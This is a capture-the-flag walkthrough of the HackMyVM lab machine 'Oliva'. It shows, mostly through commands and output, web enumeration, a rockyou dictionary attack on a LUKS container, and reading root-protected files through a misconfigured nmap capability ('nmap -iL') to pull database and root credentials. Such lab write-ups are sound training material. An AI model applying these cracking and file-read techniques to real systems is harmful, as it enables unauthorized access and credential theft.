# Oliva

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Oliva | sml | Beginner | HackMyVM |

**Summary:** Oliva is a beginner-friendly Linux machine from HackMyVM that focuses on web enumeration, cryptographic file analysis, and Linux capabilities exploitation. The attack path begins with discovering a LUKS-encrypted file accessible via a web server. After successfully brute-forcing the LUKS encryption password using rockyou.txt, the decrypted filesystem reveals SSH credentials for the user 'oliva'. Once authenticated, privilege escalation is achieved by exploiting a capability-enabled nmap binary (`cap_dac_read_search=eip`) to read sensitive PHP files containing MySQL database credentials. These credentials provide root access to MariaDB, where the actual root password is stored in plaintext within the database. This machine demonstrates the importance of proper file encryption, secure credential storage practices, and the dangers of misconfigured Linux capabilities.

---

## Reconnaissance

### Network Discovery

The initial network scan identified the target machine on the local network:

```powershell
192.168.100.2 08:00:27:E8:F7:26 VirtualBox

PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.86 08:00:27:A1:31:F4 VirtualBox
```

The target machine was identified at **192.168.100.86** with a VirtualBox MAC address, confirming it as our vulnerable VM.

### Port Scanning and Service Enumeration

A comprehensive nmap scan was performed to identify open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ nmap -sC -sV -p- -T4 192.168.100.86
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 20:59 WIB
Nmap scan report for 192.168.100.86
Host is up (0.0021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 (ECDSA)
|_  256 d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.67 seconds
```

**Key Findings:**
- **Port 22/tcp**: OpenSSH 9.2p1 Debian 2 - SSH service running
- **Port 80/tcp**: nginx 1.22.1 - Web server running
- **Operating System**: Linux (Debian-based)

The presence of both SSH and HTTP services suggests a typical web application deployment. The next logical step is to enumerate the web application for potential entry points.

### Web Application Enumeration

Directory enumeration was performed using Gobuster with the common.txt wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ gobuster dir -u http://192.168.100.86 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt                 ===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.86
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 615]
/index.php            (Status: 200) [Size: 69]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

Two files were discovered:
- `/index.html` - Default nginx welcome page (615 bytes)
- `/index.php` - Custom PHP file (69 bytes) - potentially interesting

### Web Content Analysis

The default nginx page was examined first:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ curl http://192.168.100.86/index.html
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

This is a standard nginx installation page with no useful information.

The custom PHP file revealed critical information:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ curl http://192.168.100.86/index.php
Hi oliva,
Here the pass to obtain root:


<a href="oliva">CLICK!</a>
```

**Critical Discovery:** The PHP page references a user named "oliva" and contains a link to a file named "oliva". This file is described as containing "the pass to obtain root", making it a high-priority target for download and analysis.

---

## Initial Access

### LUKS Encrypted File Acquisition

The file referenced in index.php was downloaded for analysis:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ wget http://192.168.100.86/oliva
--2026-02-05 21:03:35--  http://192.168.100.86/oliva
Connecting to 192.168.100.86:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20000000 (19M) [application/octet-stream]
Saving to: 'oliva'

oliva           100%[=====>]  19.07M  20.9MB/s    in 0.9s

2026-02-05 21:03:36 (20.9 MB/s) - 'oliva' saved [20000000/20000000]
```

The file was successfully downloaded - a 19MB binary file that required further analysis.

### File Type Identification

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ ls -la
total 19572
drwxr-xr-x   2 ouba ouba     4096 Feb  5 21:03 .
drwxrwxrwt 185 root root    36864 Feb  5 20:46 ..
-rw-r--r--   1 ouba ouba 20000000 Jul  4  2023 oliva

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ file oliva
oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offse
```

**Critical Finding:** The file is a LUKS (Linux Unified Key Setup) version 2 encrypted container. LUKS is a disk encryption specification commonly used in Linux systems. This encrypted file requires a passphrase to decrypt its contents.

### LUKS Header Analysis

To understand the encryption configuration, the LUKS header was dumped:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ cryptsetup luksDump oliva
LUKS header information
Version:        2
Epoch:          3
Metadata area:  16384 [bytes]
Keyslots area:  16744448 [bytes]
UUID:           9a391896-2dd5-4f2c-84cf-1ba6e4e0577e
Label:          (no label)
Subsystem:      (no subsystem)
Flags:          (no flags)

Data segments:
  0: crypt
        offset: 16777216 [bytes]
        length: (whole device)
        cipher: aes-xts-plain64
        sector: 512 [bytes]

Keyslots:
  0: luks2
        Key:        512 bits
        Priority:   normal
        Cipher:     aes-xts-plain64
        Cipher key: 512 bits
        PBKDF:      argon2id
        Time cost:  4
        Memory:     492082
        Threads:    1
        Salt:       e3 64 61 6a c4 21 f6 a7 be 4e e4 67 b1 c7 57 ea
                    e2 5b 73 35 ef 12 5d 6b 73 4d 8d c5 52 62 9a 6e
        AF stripes: 4000
        AF hash:    sha256
        Area offset:32768 [bytes]
        Area length:258048 [bytes]
        Digest ID:  0
Tokens:
Digests:
  0: pbkdf2
        Hash:       sha256
        Iterations: 44703
        Salt:       0a 72 0d 39 d8 c5 63 f8 24 7a 29 c2 15 cd cf d1
                    67 f0 c7 77 62 c9 38 9c 8a 46 09 dd 8a a6 d3 1e
        Digest:     20 40 66 a2 4b c6 35 cf 91 11 f0 c3 0d ae e3 51
                    b7 07 03 69 13 26 85 60 8d bd 3b 18 c1 27 9c 8e
```

**Encryption Details:**
- **Encryption Algorithm**: AES-XTS-Plain64 with 512-bit keys
- **Key Derivation**: Argon2id (memory-hard function) with PBKDF2 digest
- **Hash Algorithm**: SHA-256
- **PBKDF2 Iterations**: 44,703 iterations

The use of Argon2id makes brute-forcing more computationally expensive, but the password may still be weak enough to be found in common wordlists.

### LUKS Password Brute-Force Attack

Since the file is password-protected, a dictionary attack was attempted using the famous rockyou.txt wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ bruteforce-luks -t 4 -v 30 -f /usr/share/wordlists/rockyou.txt oliva
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
...
Tried passwords: 972
Tried passwords per second: 0.804636
Last tried password: ashlee

Password found: b[REDACTED]
```

**Success!** The LUKS encryption password was found after testing only 972 passwords from the rockyou.txt wordlist. The relatively low iteration count (972 attempts) indicates the password was near the beginning of the wordlist, suggesting it was a common/weak password.

### Decrypting the LUKS Container

With the password recovered, the encrypted container was opened using cryptsetup:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ sudo cryptsetup luksOpen oliva oliva_decrypted
[sudo] password for ouba:
Enter passphrase for oliva:

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ ls -la /dev/mapper/
total 0
drwxr-xr-x  2 root root      80 Feb  5 22:18 .
drwxr-xr-x 13 root root    3680 Feb  5 22:18 ..
crw-------  1 root root 10, 236 Feb  5 19:13 control
lrwxrwxrwx  1 root root       7 Feb  5 22:18 oliva_decrypted -> ../dm-0
```

The decrypted device was successfully mapped to `/dev/mapper/oliva_decrypted`, which links to the device mapper `/dev/dm-0`.

### Filesystem Analysis and Mounting

The decrypted device was analyzed to determine the filesystem type:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ sudo file -s /dev/dm-0
/dev/dm-0: Linux rev 1.0 ext4 filesystem data, UUID=7839beec-705e-45c5-a982-3096ac116f6e (extents) (64bit) (large files) (huge files)
```

**Filesystem Type**: EXT4 - a common Linux filesystem format that supports large files and modern features.

The filesystem was mounted to explore its contents:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ sudo mkdir -p /mnt/oliva

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ sudo mount /dev/mapper/oliva_decrypted /mnt/oliva
```

### Credential Discovery

The decrypted filesystem contained a password file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ ls -la /mnt/oliva
total 18
drwxr-xr-x 3 root root  1024 Jul  4  2023 .
drwxr-xr-x 7 root root  4096 Feb  5 22:20 ..
drwx------ 2 root root 12288 Jul  4  2023 lost+found
-rw-r--r-- 1 root root    16 Jul  4  2023 mypass.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ cat /mnt/oliva/mypass.txt
Y[REDACTED]
```

**Critical Discovery:** The file `mypass.txt` contains what appears to be the SSH password for the user 'oliva' (referenced earlier in the index.php file).

### SSH Authentication

Using the discovered credentials, SSH access was attempted:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/oliva]
└─$ ssh oliva@192.168.100.86
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
oliva@192.168.100.86's password:
Linux oliva 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64
...
oliva@oliva:~$ id
uid=1000(oliva) gid=1000(oliva) grupos=1000(oliva),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
oliva@oliva:~$ ls -la
total 32
drwx------ 3 oliva oliva 4096 jul  4  2023 .
drwxr-xr-x 3 root  root  4096 jul  4  2023 ..
lrwxrwxrwx 1 oliva oliva    9 jul  4  2023 .bash_history -> /dev/null
-rw-r--r-- 1 oliva oliva  220 jul  4  2023 .bash_logout
-rw-r--r-- 1 oliva oliva 3526 jul  4  2023 .bashrc
drwxr-xr-x 3 oliva oliva 4096 jul  4  2023 .local
-rw-r--r-- 1 oliva oliva  807 jul  4  2023 .profile
-rw------- 1 oliva oliva   24 jul  4  2023 user.txt
-rw------- 1 oliva oliva  102 jul  4  2023 .Xauthority
```

**Successful Initial Access!** We now have shell access as the user 'oliva' (UID 1000). The user flag is visible as `user.txt` in the home directory. Notable observations:
- Bash history is redirected to `/dev/null` (defensive measure to prevent command history logging)
- User belongs to multiple groups including cdrom, audio, video, plugdev, and netdev

---

## Privilege Escalation

### Capabilities Enumeration

Linux capabilities allow processes to perform privileged operations without full root access. A search for binaries with special capabilities was performed:

```bash
oliva@oliva:~$ /sbin/getcap -r / 2>/dev/null
/usr/bin/nmap cap_dac_read_search=eip
/usr/bin/ping cap_net_raw=ep
```

**Critical Finding:** The binary `/usr/bin/nmap` has the `cap_dac_read_search=eip` capability, which allows it to bypass file read permissions and directory search restrictions. This is a severe misconfiguration that can be exploited to read any file on the system, including those owned by root.

**Capability Breakdown:**
- `cap_dac_read_search`: Bypass file read permission checks and directory read/execute permission checks
- `=eip`: Effective, Inheritable, Permitted - the capability is active and can be used

### Exploiting Nmap Capabilities

To identify what files to read, the web directory was examined:

```bash
oliva@oliva:~$ cd /var/www/html
oliva@oliva:/var/www/html$ ls -la
total 19548
drwxr-xr-x 2 root     root         4096 jul  4  2023 .
drwxr-xr-x 3 root     root         4096 jul  4  2023 ..
-rw-rw---- 1 www-data www-data      615 jul  4  2023 index.html
-rw-rw---- 1 www-data www-data      163 jul  4  2023 index.php
-rw-rw---- 1 www-data www-data 20000000 jul  4  2023 oliva
```

The `index.php` file is owned by `www-data` with `640` permissions, making it unreadable by the regular 'oliva' user. However, using nmap's `cap_dac_read_search` capability, we can bypass these permission restrictions.

Nmap has a feature (`-iL`) that reads targets from a file. When nmap attempts to parse the file as a list of hosts, it will output the file contents in error messages:

```bash
oliva@oliva:/var/www/html$ nmap -iL index.php
Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-05 16:30 CET
Failed to resolve "Hi".
Failed to resolve "oliva,".
Failed to resolve "Here".
Failed to resolve "the".
Failed to resolve "pass".
Failed to resolve "to".
Failed to resolve "obtain".
Failed to resolve "root:".
Failed to resolve "<?php".
Failed to resolve "$dbname".
Failed to resolve "=".
Failed to resolve "'easy';".
Failed to resolve "$dbuser".
Failed to resolve "=".
Failed to resolve "'root';".
Failed to resolve "$dbpass".
Failed to resolve "=".
Failed to resolve "'S[REDACTED]';".
Failed to resolve "$dbhost".
Failed to resolve "=".
Failed to resolve "'localhost';".
Failed to resolve "?>".
Failed to resolve "<a".
Unable to split netmask from target expression: "href="oliva">CLICK!</a>"
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 120.15 seconds
```

**Excellent!** By parsing the error messages, we can reconstruct the PHP file contents:

```php
<?php
$dbname = 'easy';
$dbuser = 'root';
$dbpass = 'S[REDACTED]';
$dbhost = 'localhost';
?>
```

The PHP file contains MySQL/MariaDB database credentials:
- Database: `easy`
- Username: `root`
- Password: `S[REDACTED]`
- Host: `localhost`

### MySQL Database Enumeration

With the discovered database credentials, we can authenticate to the MySQL/MariaDB server:

```bash
oliva@oliva:/var/www/html$ mysql -u root -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 5
Server version: 10.11.3-MariaDB-1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| easy               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0,047 sec)

MariaDB [(none)]> use easy;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [easy]> show tables;
+----------------+
| Tables_in_easy |
+----------------+
| logging        |
+----------------+
1 row in set (0,000 sec)

MariaDB [easy]> select * from logging;
+--------+------+--------------+
| id_log | uzer | pazz         |
+--------+------+--------------+
|      1 | root | O[REDACTED]  |
+--------+------+--------------+
1 row in set (0,028 sec)
```

**Critical Discovery:** The `easy` database contains a table named `logging` with credentials stored in plaintext:
- Username: `root`
- Password: `O[REDACTED]`

This appears to be the Linux root account credentials!

### Root Access Achievement

Using the discovered root password from the database:

```bash
oliva@oliva:~$ su - root
Contraseña:
root@oliva:~# id ; whoami; hostname
uid=0(root) gid=0(root) grupos=0(root)
root
oliva
root@oliva:~# cat /home/oliva/user.txt /root/rutflag.txt
HMV[REDACTED]
HMV[REDACTED]
```

**Complete System Compromise!** Root access was successfully obtained. Both user and root flags were retrieved:
- User flag: `HMV[REDACTED]`
- Root flag: `HMV[REDACTED]`

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network discovery identifying target at 192.168.100.86, then conducted comprehensive nmap scan revealing SSH (22/tcp) and HTTP (80/tcp) services running on Debian Linux with nginx 1.22.1.

2. **Web Enumeration**: Used Gobuster to discover `/index.php` which referenced a user "oliva" and a downloadable file containing "the pass to obtain root". Downloaded a 19MB file named 'oliva' from the web server.

3. **Cryptographic Analysis**: Identified the downloaded file as a LUKS v2 encrypted container using AES-XTS-Plain64 encryption with Argon2id key derivation. Dumped LUKS header to understand encryption parameters.

4. **Password Cracking**: Executed dictionary attack using `bruteforce-luks` with rockyou.txt wordlist, successfully recovering the LUKS passphrase after 972 attempts at approximately 0.8 passwords/second.

5. **Encrypted Container Decryption**: Used `cryptsetup luksOpen` to decrypt the LUKS container, revealing an EXT4 filesystem. Mounted the decrypted filesystem and discovered `mypass.txt` containing SSH credentials.

6. **Initial Access**: Successfully authenticated via SSH as user 'oliva' using the password from the decrypted LUKS container, gaining user-level shell access (UID 1000) and retrieving the user flag.

7. **Privilege Escalation - Capabilities Enumeration**: Executed `getcap -r /` to identify binaries with special Linux capabilities, discovering `/usr/bin/nmap` with `cap_dac_read_search=eip` capability allowing bypass of file read permissions.

8. **Capability Exploitation**: Leveraged nmap's `-iL` (input from list) feature combined with its DAC read capability to bypass file permissions on `/var/www/html/index.php` (owned by www-data), extracting database credentials from the file contents displayed in nmap error messages.

9. **Database Access**: Authenticated to MariaDB server using extracted credentials (root/S[REDACTED]), enumerated the 'easy' database, and discovered the 'logging' table containing plaintext Linux root credentials.

10. **Root Compromise**: Used `su - root` with the password retrieved from the database, successfully escalating to UID 0 (root), achieving complete system compromise, and retrieving both user and root flags (HMV[REDACTED]).